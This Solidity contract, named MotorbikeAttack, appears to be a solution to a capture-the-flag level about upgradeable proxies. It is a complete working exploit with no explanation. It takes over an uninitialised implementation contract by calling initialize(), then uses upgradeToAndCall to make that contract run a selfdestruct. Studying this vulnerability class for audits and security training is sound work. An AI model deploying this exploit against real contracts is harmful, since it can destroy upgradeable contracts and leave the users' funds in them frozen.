// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

contract MotorbikeAttack {
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    address impl;
    
    constructor(address _impl) {
      impl = _impl;
      impl.call(abi.encodeWithSignature("initialize()"));
    }
    
    function attack() external {
      bytes memory data = abi.encodeWithSignature("destroy()");
      impl.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(this), data));
    }

    function destroy() external {
      selfdestruct(payable(address(this)));
    }
}
